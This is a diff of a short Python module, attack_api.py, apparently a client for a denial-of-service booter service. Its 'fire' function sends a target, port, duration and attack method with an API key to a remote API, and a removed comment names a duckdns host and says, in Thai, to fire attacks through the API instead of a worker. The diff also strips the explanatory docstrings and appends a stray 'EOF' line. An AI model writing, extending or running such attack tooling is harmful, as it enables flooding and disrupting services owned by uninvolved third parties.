@@ -1,18 +1,11 @@
+
 # attack_api.py
-"""
-API client for api888.duckdns.org
-ใช้ยิงผ่าน API แทน Worker
-"""
 import aiohttp
 from config import API_BASE, API_KEY, API_METHOD
 
 
 async def fire(target: str, port: int, duration: int,
                method: str = API_METHOD) -> dict:
-    """
-    ยิงผ่าน API
-    Returns: dict จาก API
-    """
     url = (
         f"{API_BASE}?key={API_KEY}"
         f"&target={target}"
@@ -27,3 +20,4 @@ async def fire(target: str, port: int, duration: int,
                 return data
     except Exception as e:
         return {"success": False, "error": str(e)}
+EOF
